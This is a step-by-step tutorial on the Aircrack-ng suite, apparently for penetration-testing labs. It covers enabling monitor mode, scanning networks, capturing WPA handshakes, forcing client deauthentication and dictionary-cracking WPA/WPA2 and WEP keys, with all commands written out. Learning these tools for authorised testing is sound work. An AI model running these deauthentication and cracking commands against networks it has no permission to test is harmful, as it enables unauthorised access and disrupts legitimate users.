The **Aircrack-ng suite** is a set of command-line tools used to audit the security of Wi-Fi networks. In practice, **Airodump-ng** is used to scan and capture wireless traffic, while **Aircrack-ng** is used to analyze captured data and attempt to recover WEP or WPA/WPA2-PSK keys offline. These tools are commonly used in penetration testing labs and controlled security assessments.

---

## 1) Environment Preparation

### Identify wireless interface

```bash
iwconfig
```

### Stop conflicting processes

```bash
sudo airmon-ng check kill
```

### Enable monitor mode

```bash
sudo airmon-ng start wlan0
```

This creates a monitor interface such as `wlan0mon`.

---

## 2) Scan and Identify Target Network

### Scan all nearby networks

```bash
sudo airodump-ng wlan0mon
```

Identify and note:

- **BSSID** (AP MAC address)
    
- **Channel**
    
- **ESSID** (network name)


---

## 3) Capture WPA/WPA2 Handshake

### Focused capture on a specific AP

```bash
sudo airodump-ng --bssid 00:11:22:33:44:55 -c 6 -w handshake wlan0mon
```

This command locks to one channel and saves captured packets to a file.

---

## 4) Force Handshake (Deauthentication)

If no handshake appears, force a client reconnection. While you are executing the previous `airodump-ng` command, also execute the following deauthentication command:

```bash
sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```

Check the airodump-ng window for:

```
WPA handshake: 00:11:22:33:44:55
```

---

## 5) Crack WPA/WPA2 Password

### Dictionary attack

```bash
sudo aircrack-ng -w /path/to/wordlist.txt -b 00:11:22:33:44:55 handshake-01.cap
```

Aircrack-ng tests each password in the wordlist against the captured handshake.

---

## 6) Crack WEP Networks (Legacy)

If the target uses WEP:

```bash
sudo aircrack-ng -b 00:11:22:33:44:55 capture.cap
```

Requires a large number of captured IVs.
